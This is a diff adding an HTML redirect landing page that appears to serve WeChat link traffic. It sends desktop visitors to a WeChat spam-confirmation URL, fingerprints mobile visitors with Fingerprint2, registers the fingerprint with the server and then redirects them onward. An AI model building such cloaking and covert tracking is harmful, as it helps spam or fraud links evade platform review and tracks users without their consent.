@@ -1,0 +1,256 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>正在为您加载最优线路...</title>
+      <!--限制 判断是不是爬虫如果是就不跳转-->
+        <script>
+    function mayIComing() {
+        var comming = true;
+        if (typeof console === 'undefined') {
+            comming = false;
+        } else if (typeof navigator === 'undefined') {
+            comming = false;
+        } else if (navigator.webdriver) {
+            comming = false;
+        } else if (typeof screen === 'undefined') {
+            comming = false;
+        } else if (screen.width < 100 || screen.height < 100) {
+            comming = false;
+        } else if (typeof navigator.userAgent === 'undefined') {
+            comming = false;
+        } else if (typeof getComputedStyle !== 'function') {
+            comming = false;
+        } else if (typeof window === 'undefined') {
+            comming = false;
+        } else if (typeof window.addEventListener === 'undefined') {
+            comming = false;
+        } else if (typeof JSON === 'undefined') {
+            comming = false;
+        }
+
+        return comming;
+    }
+</script>
+<style type="text/css">
+ 
+.loading{
+	position:absolute;margin:auto;top:0;bottom:0;left:0;right:0;width:6.250em;height:6.250em;
+	
+	-webkit-animation:rotate 2.4s linear infinite;
+	-moz-animation:rotate 2.4s linear infinite;
+	-o-animation:rotate 2.4s linear infinite;
+	animation:rotate 2.4s linear infinite;
+}
+.loading .white {
+	top:0;bottom:0;left:0;right:0;background:white;opacity:0;
+	
+	-webkit-animation:flash 2.4s linear infinite;
+	-moz-animation:flash 2.4s linear infinite;
+	-o-animation:flash 2.4s linear infinite;
+	animation:flash 2.4s linear infinite;
+}
+.loading .dot {
+	position:absolute;margin:auto;width:2.4em;height:2.4em;border-radius:100%;
+	
+	-webkit-transition:all 1s ease;
+	-moz-transition:all 1s ease;
+	-o-transition:all 1s ease;
+	transition:all 1s ease;
+}
+.loading .dot:nth-child(2) {
+	top:0;bottom:0;left:0;background:#FF4444;
+	
+	-webkit-animation:dotsY 2.4s linear infinite;
+	-moz-animation:dotsY 2.4s linear infinite;
+	-o-animation:dotsY 2.4s linear infinite;
+	animation:dotsY 2.4s linear infinite;
+}
+.loading .dot:nth-child(3) {
+	left:0;right:0;top:0;background:#FFBB33;
+	
+	-webkit-animation:dotsX 2.4s linear infinite;
+	-moz-animation:dotsX 2.4s linear infinite;
+	-o-animation:dotsX 2.4s linear infinite;
+	animation:dotsX 2.4s linear infinite;
+}
+.loading .dot:nth-child(4) {
+	top:0;bottom:0;right:0;background:#99CC00;
+	
+	-webkit-animation:dotsY 2.4s linear infinite;
+	-moz-animation:dotsY 2.4s linear infinite;
+	-o-animation:dotsY 2.4s linear infinite;
+	animation:dotsY 2.4s linear infinite;
+}
+.loading .dot:nth-child(5) {
+	left:0;right:0;bottom:0;background:#33B5E5;
+	
+	-webkit-animation:dotsX 2.4s linear infinite;
+	-moz-animation:dotsX 2.4s linear infinite;
+	-o-animation:dotsX 2.4s linear infinite;
+	animation:dotsX 2.4s linear infinite;
+}
+@keyframes rotate {
+	0% {
+		-webkit-transform:rotate( 0 );
+		-moz-transform:rotate( 0 );
+		-o-transform:rotate( 0 );
+		transform:rotate( 0 );
+	}
+	10% {
+		width:6.250em;
+		height:6.250em;
+	}
+	66% {
+		width:2.4em;
+		height:2.4em;
+	}
+	100% {
+		-webkit-transform:rotate(360deg);
+		-moz-transform:rotate(360deg);
+		-o-transform:rotate(360deg);
+		transform:rotate(360deg);
+		width:6.250em;
+		height:6.250em;
+	}
+}
+
+@keyframes dotsY {
+	66% {
+		opacity:.1;
+		width:2.4em;
+	}
+	77% {
+		opacity:1;
+		width:0;
+	}
+}
+
+@keyframes dotsX {
+	66% {
+		opacity:.1;
+		height:2.4em;
+	}
+	77% {
+		opacity:1;
+		height:0;
+	}
+}
+
+@keyframes flash {
+	33% {
+		opacity:0;
+		border-radius:0%;
+	}
+	55% {
+		opacity:.6;
+		border-radius:100%;
+	}
+	66% {
+		opacity:0;
+	}
+}
+</style>
+	<script src="/fingerprint2.min.js"></script>
+
+
+</head>
+
+<body>
+
+<div class="loading">
+	<div class="dot white"></div>
+	<div class="dot"></div>
+	<div class="dot"></div>
+	<div class="dot"></div>
+	<div class="dot"></div>
+</div>
+
+<!--<form action="{$url}" id="myform" method="get">-->
+<!--    -->
+<!--    <input type="hidden" name="f" value="{$f}">-->
+<!--    <input type="hidden" name="view_id" value="{$view_id}">-->
+<!--    <input type="hidden" name="h_url" value="{$hezi}">-->
+<!--    -->
+<!--    -->
+<!--    <input name="fingerprint"  value="123123" id="fingerprint" style="display:none;">-->
+<!--    -->
+
+
+<!--     <input type="submit" value="" id='btn' class=""/>-->
+<!--    -->
+<!--</form>-->
+
+
+</body>
+
+
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script type="text/javascript">
+
+var ff = "{$pc}";
+if(ff == 1)
+{
+
+	var system = {win: false, mac: false, xll: false};
+	var p = navigator.platform;
+	system.win = p.indexOf("Win") == 0;
+	system.mac = p.indexOf("Mac") == 0;
+	system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
+	if (system.win || system.mac || system.xll) {
+		window.location.href = "https://weixin110.qq.com/cgi-bin/mmspamsupport-bin/newredirectconfirmcgi?main_type=2&evil_type=0&source=2";
+	}
+}
+
+function aa()
+{
+    try {
+        Fingerprint2.get(function (components) {
+            const values = components.map(function (component, index) {
+                if (index === 0) { //把微信浏览器里UA的wifi或4G等网络替换成空,不然切换网络会ID不一样
+                    return component.value.replace(/\bNetType\/\w+\b/, '')
+                }
+                return component.value
+            })
+            // 生成最终id murmur
+            const murmur = Fingerprint2.x64hash128(values.join(''), 32)
+           // document.getElementById("fingerprint").value = murmur
+            //console.log(document.getElementById("fingerprint").value)
+            var url = "{$url}?f={$f}&view_id={$view_id}&h_url={$hezi}&fingerprint="+murmur;
+            if(murmur)
+			{
+				var p = {
+					f:"{$f}",
+					fingerprint:murmur
+				};
+				$.getJSON('/index/index/create',p,function (e) {
+					console.log(e)
+					if(e.status == 1)
+					{
+						location.href = url;
+					}
+				})
+			}
+            // document.getElementById("btn").click()
+        })
+    } catch (error) {
+        console.log(error)
+        // alert(error)
+    }
+
+}
+
+
+aa();
+
+
+
+
+
+
+
+
+</script>
+
+</html>
